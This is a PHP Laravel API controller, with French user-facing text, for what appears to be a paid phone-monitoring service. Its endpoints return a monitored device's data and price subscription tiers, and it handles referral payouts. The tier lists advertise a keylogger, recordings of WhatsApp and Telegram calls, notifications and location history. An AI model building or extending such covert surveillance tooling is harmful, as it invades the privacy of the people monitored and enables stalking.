<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\App;
use App\Models\Errorlog;
use App\Models\Pendingmail;
use App\Models\Phone;
use App\Models\Taux;
use App\Models\Withdraw;
use App\Traits\ApiResponser;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Yajra\DataTables\DataTables;

class DataAPIController extends Controller
{
    use ApiResponser;
    function phoneapps()
    {
        $user = Auth::user();
        $phone_id = request('phone_id');
        $phone = Phone::where('id', $phone_id)->with(['apps' => function ($q) {
            $q->orderBy('name');
        }])->get();

        abort_if(!$phone_id || !count($phone), 422, "No phone");
        if ($user->user_role == 'client') {
            $up = $user->phones->pluck('id')->all();
            abort_if(!in_array($phone_id, $up), 403, "No data");
        }

        $phone = $phone->map(function ($e) {
            $o = (object) $e->toArray();
            $o->updatedon = $e->updatedon?->format('d-m-Y H:i:s');
            $o->fcm = !!$e->fcm;
            $o->data = (object) json_decode($e->data);
            $o->perms = (object) json_decode($e->perms);
            $o->config = (object) json_decode($e->config);
            $o->name = $o->name;
            $o->subscription = phonesubscription($e);
            return $o;
        });
        return $phone[0];
    }

    function subinfo()
    {
        if (request('action') == 'subscription') {
            $validator = Validator::make(request()->all(), [
                'devise' => 'required|in:CDF,USD',
                'phone_id' => 'required|numeric|exists:phone,id',
                'subtype' => 'required|string|in:basic,premium',
            ]);
            if ($validator->fails()) {
                abort(422, implode(' ', $validator->errors()->all()));
            }
            $data = $validator->validate();
            gettaux();
            $subamount = v($data['subtype'] == 'basic' ? 10 : 15, 'USD');
            $payamount = $data['subtype'] == 'basic' ? 10 : 15;
        } else if (request('action') == 'reset') {
            $validator = Validator::make(request()->all(), [
                'devise' => 'required|in:CDF,USD',
                'phone_id' => 'required|numeric|exists:phone,id',
            ]);
            if ($validator->fails()) {
                abort(422, implode(' ', $validator->errors()->all()));
            }
            $data = $validator->validate();
            gettaux();
            $subamount = v(5, 'USD');
            $payamount =  5;
        } else {
            abort(403, "Invalid action");
        }

        if ($data['devise'] == 'CDF') {
            $taux = Taux::first();
            abort_if(!$taux,  403, "Payment not available");
            $payamount *= $taux->usd_cdf;
            $payamount = round($payamount);
        }
        return [
            'subamount' => $subamount,
            'payamount' => $payamount,
        ];
    }

    function subcapability()
    {
        isHisPhone();
        $user = Auth::user();
        $phone_id = request('phone_id');
        $phone = Phone::where('id', $phone_id)->first();
        $sub = phonesubscription($phone);

        $h = '';
        if (in_array($sub->type, ['PREMIUM', 'TRIAL'])) {
            $h = <<<T
                <p class="font-weight-bold mb-1">
                    Vous avez un accès quotidien
                    <b class="text-danger">ILLIMITÉ</b> à toutes les fonctionnalité jusqu'au $sub->to.
                </p>
            T;
        } else if ($sub->type == 'BASIC') {
            $h = <<<T
                <ul class="list-unstyled">
                    <li> <i class="fa fa-check-circle text-primary"></i> 30 Actions quotidiennes</li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès aux 50 premières
                        notifications</li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès à l'historique de 10
                        premiers appels</li>
                    <li>
                        <i class="fa fa-check-circle text-primary"></i> Accès aux 5 premiers
                        enregistrements
                        d'appels : téléphoniques, Whatsapp & Telegram
                    </li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès à l'historique de
                        localisation de 00h jusqu'à 12h</li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès au Key logger de 00h à
                        12h</li>
                </ul>
            T;
        }

        if (!$sub->active) {
            $h = <<<T
                    <ul class="list-unstyled">
                    <li> <i class="fa fa-check-circle text-primary"></i> 2 Actions quotidiennes</li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès aux 5 premières
                        notifications</li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès à l'historique de 2
                        premiers appels</li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès à l'historique de
                        localisation de 08h jusqu'à 12h</li>
                    <li> <i class="fa fa-check-circle text-primary"></i> Accès au Key logger de 08h à
                        12h</li>
                </ul>
            T;
        }
        return $h;
    }

    function applog()
    {
        abort_if(Auth::user()->user_role != 'admin', 403, "WTF");

        $data = Errorlog::query();

        return DataTables::of($data)
            ->rawColumns(['data'])
            ->editColumn('date', function ($row) {
                return $row->date->format('d-m-Y H:i:s');
            })
            ->make(true);
    }

    function withdraw()
    {
        abort_if(Auth::user()->user_role != 'client', 403, "WTF");
        $validator = Validator::make(request()->all(), [
            'devise' => 'required|in:CDF,USD',
            'phone' => ['required', 'numeric', 'regex:/(90|99|97|98|80|81|82|83|84|85|89)[0-9]{7}/']
        ]);

        if ($validator->fails()) {
            return $this->error(implode(", ", $validator->errors()->all()));
        }

        $user = auth()->user();
        $d = [];
        $d['date'] = nnow();
        $d['currency'] = $dev =  request('devise');
        $d['number'] = $phone = request('phone');
        $d['status'] = 0;
        $d['users_id'] = $user->id;
        $bal = $user->balances()->where('currency', $dev)->sum('amount');
        abort_if(!$bal, 422, "Votre balance $dev est insufisant.");
        $d['amount'] = $bal;
        $phone  = "0$phone";

        DB::beginTransaction();
        Withdraw::create($d);
        $user->balances()->where('currency', $dev)->update(['amount' => 0]);

        $mess = "Envoi fonds de parrainage pour $user->name, " .  v($bal, $dev) . " au $phone";
        Pendingmail::create([
            'subject' => "Envoi fonds de Parrainage",
            'to' => 'go@gooomart.com',
            'text' => $mess,
            'date' => nnow(),
        ]);

        $mess = "Bonjour $user->name, votre retrait de " .  v($bal, $dev) . " au $phone a été soumis avec succès et sera traité sous peu.";
        Pendingmail::create([
            'subject' => "Retrait fonds de Parrainage",
            'to' => $user->email,
            'text' => $mess,
            'date' => nnow(),
        ]);

        DB::commit();
        return $this->success("Votre retrait de " .  v($bal, $dev) . " au $phone sera traité sous peu, merci de patienter.");
    }
}
